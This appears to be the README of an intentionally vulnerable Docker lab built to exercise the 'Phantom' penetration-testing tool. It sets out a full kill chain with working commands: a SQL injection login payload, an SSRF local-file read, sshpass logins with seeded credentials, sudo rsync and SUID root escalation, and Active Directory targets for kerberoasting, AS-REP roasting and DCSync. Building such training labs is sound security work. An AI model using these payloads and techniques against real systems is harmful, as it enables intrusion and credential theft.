# Phantom Lab — multi-host, hard

**Intentionally vulnerable target for LOCAL, authorized testing only.**

This is a segmented, isolated-lab network that mimics a real-ish enterprise
so Phantom's modules can be exercised end-to-end, including **vertical and
lateral movement**, plus a **real Active Directory domain controller** for the
AD chain. Never expose the `lab_net` subnet or these ports to any network you
do not control.

## Topology

- **`dmz`** (`172.28.0.10`, ports 2222/2121/8081 published) — internet-facing.
- **`internal`** (`172.28.0.20`, **no** published ports, only on `lab_net`) —
  reachable only by pivoting through the DMZ.
- **`dc`** (`172.28.0.30`, **no** published ports) — Samba AD DC for
  `CORP.LOCAL` (Kerberos 88, LDAP 389/636, SMB 445, GC 3268). Reach it from
  a foothold inside `lab_net` (pivot from `dmz`), an ephemeral container on
  the network, or from your Kali if it can route to the Docker bridge.

```
you ──> dmz (web 8081 / ssh 2222) ──pivot──> internal (ssh 22) ──ad──> dc
```

## The full kill chain a red teamer has to walk

1. **Web (`8081`)** — UNION SQLi in the login (`' OR '1'='1' --`) dumps the
   user table (admin/backup) and an SSRF endpoint `/export?url=` reads local
   files. The **backup** SSH password is **NOT in any wordlist** — it only
   comes from the app (SQLi / SSRF on `/opt/corp/backup_credentials.txt`).
2. **SSH `dmz` (`2222`)** — `backup` / `S3cureB4ckup!22`.
3. **Vertical `dmz`** — `backup` can `sudo rsync` (GTFObins) → root on `dmz`.
4. **Lateral → `internal`** — `/home/backup/.backup/pivot.txt` holds the
   `internal` credentials (`dev` / `Piv0tMe!2024`) and host. `dev` is not in
   wordlists either; it comes from the pivot secrets.
5. **Vertical `internal`** — SUID binary `/usr/local/bin/roothelper`
   (`find / -perm -4000`) → root.
6. **Proof** — `/root/flag.txt` → `PHANTOM{internal_root_compr0mised_8912}`.

## The domain controller (`dc`) — real AD, fully up

The `dc` container provisions a **real Samba AD DC** (`CORP.LOCAL`, Samba
4.17, Kerberos + LDAP + SMB + GC) on first boot and seeds attack objects:

| object | purpose |
| --- | --- |
| `svc_sql` / `Svc!2024Strong` | service account with SPN `HTTP/svc-sql.corp.local` → **kerberoast** target |
| `norep` / `NoRep!2024Strong` | `userAccountControl = 4194816` (DONT_REQUIRE_PREAUTH) → **AS-REP roast** target |
| `adadmin` / `DAdmin!2024Strong` | member of **Domain Admins** → DCSync / DA actions |
| `Administrator` / `Admin!2024` | domain admin from provisioning |

Three fixes were required to get Samba booting in Docker — all are in the
repo (`lab/dc/Dockerfile`, `lab/dc/entrypoint.sh`, `docker-compose.yml`):

1. **`samba-vfs-modules`** must be installed — `acl_xattr` (needed for the
   sysvol NT-ACL set during provisioning) ships there, not in `samba`.
2. **`CAP_SYS_ADMIN`** must be added to the `dc` service: provisioning writes
   `security.NTACL` xattrs on sysvol, and Docker drops the capability that
   permits that write (`Operation not permitted` otherwise).
3. The seeding code previously passed a value to `--must-change-at-next-login`
   (a boolean flag) and used `--given-name`/`--surname` on the AS-REP user —
   Samba then built CN from the display name (`CN=No PreAuth`) instead of the
   username, breaking the `ldbmodify` DN that disables pre-auth.

**What is verified live against the container** (impacket / ldap3 from an
ephemeral container on `lab_net`):

- Anonymous LDAP **rootDSE works** → `namingContexts` visible, exactly what
  Phantom's `ad_enum` needs (domain discovery).
- Authenticated LDAP (LDAPS + Administrator) can read and modify AD objects
  (the `userAccountControl` on `norep` is confirmed `0x400200` server-side).
- Kerberos AS works with valid credentials and `GetUserSPNs` lists the
  `svc_sql` SPN through authenticated enumeration.
- SMB / LDAP / KDC / GC / RPC all listen inside `lab_net`.

**Honest environment notes** (validated in this Docker-on-Windows setup, so
re-verify on your Kali — they are Samba-4.17/impacket version interactions,
not missing objects):

- The Heimdal KDC in Samba 4.17 still answers an AS-REQ without pre-auth with
  `KDC_ERR_PREAUTH_REQUIRED` even when the account carries the
  `DONT_REQUIRE_PREAUTH` bit (the bit is stored and visible over LDAP). If
  `GetNPUsers.py -request` misbehaves the same way on your box, exercise the
  AS-REP path against a Windows DC / GOAD instead.
- `secretsdump.py -just-dc` (impacket 0.13) reaches DRSUAPI but the Samba
  server logs `Failed to decode remote prefixMap` and returns no hashes — a
  known Samba↔impacket DRSUAPI friction; validate DCSync against a Windows
  DC / GOAD, or an older impacket, for the definitive green.

The AD chain itself (`ad_enum -> kerberoast/as_rep_roast -> hash_crack`, and
`dc_sync` once a DA/NTLM path is available) is unit + E2E tested against a
scripted domain (see `tests/test_automation_post.py`) — these notes only
concern the *live Samba* substrate.

## Start

```bash
cd lab
docker compose up -d --build
```

## Verify the pieces

```bash
# SQLi → admin table (creds not in wordlist)
curl -s -d "username=' OR '1'='1' -- &password=x" http://127.0.0.1:8081/login

# SSRF → pivot secrets readable through the app
curl -s "http://127.0.0.1:8081/export?url=file:///home/backup/.backup/pivot.txt"

# AD: anonymous rootDSE against the DC — the exact operation Phantom's
# ad_enum runs — from an ephemeral container on the lab network
docker run --rm --network lab_lab_net --entrypoint bash debian:bookworm-slim \
  -c 'apt-get update -qq && apt-get install -y -qq ldap-utils >/dev/null 2>&1 && \
      ldapsearch -x -H ldap://172.28.0.30 -s base namingContexts'

# SSH to dmz (use sshpass from your operator box)
sshpass -p 'S3cureB4ckup!22' ssh -p 2222 backup@127.0.0.1

# Lateral dmz -> internal (nested ssh, operator runs this from dmz)
sshpass -p 'Piv0tMe!2024' ssh dev@172.28.0.20

# Vertical on internal -> root
echo 'id; cat /root/flag.txt' | /usr/local/bin/roothelper
```

## What this exercises in Phantom

- `scan` (nmap `-sV`), `brute`/`web_creds` (SQLi + SSRF credential recovery),
  `exploit` (SQLi PoC), `ssh_login`
- `payload`/`handler`/pivot + lateral movement (`ssh_pivot`, `smb_pivot`,
  `winrm_pivot` equivalent paths)
- `privesc` detection (`sudo`/SUID) → vertical movement
- beacon deploy + persistence + reports
- auto-mode live reasoning (`verbose`) through a segmented network

## Legal

Own machine, own containers. Authorized testing only. Phantom is for
authorized penetration testing only.